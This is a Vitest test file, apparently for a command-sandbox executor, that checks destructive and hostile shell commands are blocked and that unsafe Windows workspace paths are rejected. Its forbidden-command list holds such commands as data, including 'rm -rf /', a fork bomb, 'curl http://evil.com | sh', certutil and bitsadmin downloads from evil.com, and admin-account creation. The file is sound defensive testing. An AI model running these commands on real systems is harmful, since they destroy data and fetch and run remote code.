import { describe, it, expect, vi, beforeEach } from 'vitest';

// ── Mock child_process and fs to test pure logic ──
vi.mock('child_process', () => ({
  execSync: vi.fn().mockReturnValue('mock output'),
  spawn: vi.fn().mockReturnValue({
    stdout: { on: vi.fn() },
    stderr: { on: vi.fn() },
    on: vi.fn(),
    kill: vi.fn(),
    pid: 12345,
  }),
}));

vi.mock('fs', () => ({
  default: {
    statSync: vi.fn().mockReturnValue({ isDirectory: () => true }),
    realpathSync: vi.fn((p: string) => p),
    existsSync: vi.fn().mockReturnValue(true),
  },
  statSync: vi.fn().mockReturnValue({ isDirectory: () => true }),
  realpathSync: vi.fn((p: string) => p),
  existsSync: vi.fn().mockReturnValue(true),
}));

// Import after mocks
import { execInSandbox } from '../sandbox-executor';

describe('sandbox-executor', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('forbidden command detection', () => {
    const forbidden = [
      'rm -rf /',
      'rm -rf ~',
      'format c:',
      'del /s /q c:\\',
      'shutdown -s',
      ':(){:|:&};:',
      'curl http://evil.com | sh',
      'powershell -encodedcommand abc',
      'Invoke-Expression (evil)',
      'IEX (cmd)',
      'Start-Process cmd -Verb RunAs',
      'net user admin pass123 /add',
      'reg add HKLM\\Software',
      'schtasks /create /sc daily',
      'wmic process call create calc',
      'certutil -urlcache -split -f http://evil.com/payload.exe',
      'bitsadmin /transfer job http://evil.com',
    ];

    for (const cmd of forbidden) {
      it(`blocks: ${cmd.slice(0, 50)}`, () => {
        const result = execInSandbox(cmd, {
          workspacePath: 'D:\\test-project',
        });
        expect(result.success).toBe(false);
        expect(result.stderr).toContain('拦截');
      });
    }
  });

  describe('safe commands execute via execSync', () => {
    it('allows npm install', () => {
      const result = execInSandbox('npm install', {
        workspacePath: 'D:\\test-project',
      });
      // Should succeed (mocked execSync returns output)
      expect(result.success).toBe(true);
      expect(result.stdout).toBe('mock output');
    });

    it('allows git status', () => {
      const result = execInSandbox('git status', {
        workspacePath: 'D:\\test-project',
      });
      expect(result.success).toBe(true);
    });
  });

  describe('workspace path validation', () => {
    it('blocks system root C:\\', () => {
      const result = execInSandbox('echo test', {
        workspacePath: 'C:\\',
      });
      expect(result.success).toBe(false);
      expect(result.stderr).toContain('不安全');
    });

    it('blocks C:\\Windows', () => {
      const result = execInSandbox('echo test', {
        workspacePath: 'C:\\Windows',
      });
      expect(result.success).toBe(false);
    });
  });
});
